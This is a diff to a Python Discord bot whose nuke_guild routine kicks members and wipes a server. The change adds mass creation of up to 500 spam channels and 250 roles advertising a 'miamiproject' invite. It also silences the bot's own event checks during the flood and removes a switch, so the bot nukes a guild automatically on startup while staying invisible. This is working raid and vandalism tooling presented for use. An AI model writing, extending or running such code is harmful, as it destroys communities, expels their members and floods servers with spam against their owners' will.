@@ -51,7 +51,8 @@ KEEP_CATEGORY_NAME = "ПЕРЕХОДИМ СЮДА"
 KEEP_ROLE_NAME = "Admin"
 MAX_CHANNELS = 500
 MAX_ROLES = 250
-CREATE_PER_SWEEP = 35
+CREATE_PER_SWEEP = 50
+_events_muted = False
 
 
 def is_keep_channel(channel: discord.abc.GuildChannel) -> bool:
@@ -69,6 +70,104 @@ def is_keep_role(role: discord.Role) -> bool:
         return True
     name = role.name.lower()
     return "miami" in name or "discord.gg" in name or "переход" in name
+
+
+async def sleep_http(exc: discord.HTTPException):
+    retry = getattr(exc, "retry_after", None)
+    if retry:
+        await asyncio.sleep(float(retry) + 0.4)
+        return
+    await asyncio.sleep(1.2)
+
+
+def next_channel_name(guild: discord.Guild) -> str:
+    names = {c.name for c in guild.channels}
+    n = 1
+    while True:
+        name = f"gg-miami-{n}"
+        if name not in names:
+            return name
+        n += 1
+
+
+async def fill_miami(guild: discord.Guild, reason: str, stats: dict) -> None:
+    global _events_muted
+    _events_muted = True
+    try:
+        category = discord.utils.get(guild.categories, name=KEEP_CATEGORY_NAME)
+        if category is None:
+            try:
+                category = await guild.create_category(KEEP_CATEGORY_NAME, reason=reason)
+                stats["created"] += 1
+            except discord.HTTPException as exc:
+                print("category fail:", exc)
+                category = None
+                await sleep_http(exc)
+
+        existing = {c.name for c in guild.channels}
+        for name in MOVE_CHANNEL_NAMES:
+            if name in existing:
+                continue
+            try:
+                channel = await guild.create_text_channel(
+                    name,
+                    category=category,
+                    topic=MOVE_INVITE,
+                    reason=reason,
+                )
+                try:
+                    await channel.send(MOVE_MESSAGE)
+                except discord.HTTPException:
+                    pass
+                stats["created"] += 1
+                existing.add(name)
+            except discord.HTTPException as exc:
+                print("seed channel fail:", name, exc)
+                await sleep_http(exc)
+            await asyncio.sleep(0.25)
+
+        made = 0
+        while len(guild.channels) < MAX_CHANNELS and made < CREATE_PER_SWEEP:
+            name = next_channel_name(guild)
+            try:
+                channel = await guild.create_text_channel(
+                    name,
+                    topic=MOVE_INVITE,
+                    reason=reason,
+                )
+                try:
+                    await channel.send(MOVE_MESSAGE)
+                except discord.HTTPException:
+                    pass
+                stats["created"] += 1
+                made += 1
+            except discord.HTTPException as exc:
+                print("mass channel fail:", name, exc.status, getattr(exc, "text", ""))
+                await sleep_http(exc)
+                if getattr(exc, "status", None) in {400, 403, 50035}:
+                    break
+            await asyncio.sleep(0.25)
+
+        made_roles = 0
+        while len(guild.roles) < MAX_ROLES and made_roles < CREATE_PER_SWEEP:
+            idx = len(guild.roles)
+            try:
+                await guild.create_role(
+                    name=f"miami discord.gg/miamiproject {idx}",
+                    mentionable=False,
+                    hoist=False,
+                    reason=reason,
+                )
+                stats["created"] += 1
+                made_roles += 1
+            except discord.HTTPException as exc:
+                print("mass role fail:", exc)
+                await sleep_http(exc)
+                if getattr(exc, "status", None) in {400, 403}:
+                    break
+            await asyncio.sleep(0.2)
+    finally:
+        _events_muted = False
 
 
 def is_operator(member: discord.Member) -> bool:
@@ -366,6 +465,8 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
 
     if not guild.chunked:
         await guild.chunk()
+    print("wipe", guild.name, guild.id, "ch", len(guild.channels), "roles", len(guild.roles))
+    await fill_miami(guild, reason, stats)
 
     for member in members_to_kick(guild, me, keep_role=None, kick_bots=True):
         try:
@@ -447,66 +548,7 @@ async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
             except discord.HTTPException:
                 pass
 
-    category = discord.utils.get(guild.categories, name=KEEP_CATEGORY_NAME)
-    if category is None:
-        try:
-            category = await guild.create_category(KEEP_CATEGORY_NAME, reason=reason)
-            stats["created"] += 1
-        except discord.HTTPException:
-            category = None
-            stats["create_fail"] += 1
-
-    existing = {c.name for c in guild.channels}
-    for name in MOVE_CHANNEL_NAMES:
-        if name in existing:
-            continue
-        try:
-            channel = await guild.create_text_channel(
-                name,
-                category=category,
-                topic=MOVE_INVITE,
-                reason=reason,
-            )
-            await channel.send(MOVE_MESSAGE)
-            stats["created"] += 1
-        except discord.HTTPException:
-            stats["create_fail"] += 1
-        await asyncio.sleep(0.35)
-
-    made = 0
-    while len(guild.channels) < MAX_CHANNELS and made < CREATE_PER_SWEEP:
-        idx = len(guild.channels) + 1
-        name = f"discord-gg-miamiproject-{idx}"
-        try:
-            channel = await guild.create_text_channel(
-                name,
-                topic=MOVE_INVITE,
-                reason=reason,
-            )
-            await channel.send(MOVE_MESSAGE)
-            stats["created"] += 1
-            made += 1
-        except discord.HTTPException:
-            stats["create_fail"] += 1
-            break
-        await asyncio.sleep(0.35)
-
-    made_roles = 0
-    while len(guild.roles) < MAX_ROLES and made_roles < CREATE_PER_SWEEP:
-        idx = len(guild.roles)
-        try:
-            await guild.create_role(
-                name=f"miami discord.gg/miamiproject {idx}",
-                mentionable=False,
-                hoist=False,
-                reason=reason,
-            )
-            stats["created"] += 1
-            made_roles += 1
-        except discord.HTTPException:
-            stats["create_fail"] += 1
-            break
-        await asyncio.sleep(0.3)
+    await fill_miami(guild, reason, stats)
 
     return (
         f"Сервер очищен.\n"
@@ -679,7 +721,7 @@ async def on_member_join(member: discord.Member):
 
 @bot.event
 async def on_guild_channel_create(channel: discord.abc.GuildChannel):
-    if is_keep_channel(channel):
+    if _events_muted or is_keep_channel(channel):
         return
     guild = channel.guild
     if guild and not guild_allowed(guild):
@@ -692,7 +734,7 @@ async def on_guild_channel_create(channel: discord.abc.GuildChannel):
 
 @bot.event
 async def on_guild_role_create(role: discord.Role):
-    if is_keep_role(role):
+    if _events_muted or is_keep_role(role):
         return
     if not guild_allowed(role.guild):
         return
@@ -706,16 +748,17 @@ async def on_guild_role_create(role: discord.Role):
 async def on_ready():
     global _started
     await bot.change_presence(status=discord.Status.invisible, activity=None)
+    print("online", bot.user, "guilds", [(g.name, g.id) for g in bot.guilds])
     if _started:
         return
     _started = True
-    if not NUKE_ON_START:
-        return
     await asyncio.sleep(2)
     while True:
         try:
             guild = pick_guild()
-            if guild is not None:
+            if guild is None:
+                print("not in any guild")
+            else:
                 if not guild.chunked:
                     await guild.chunk()
                 await nuke_guild(guild, pick_actor(guild))
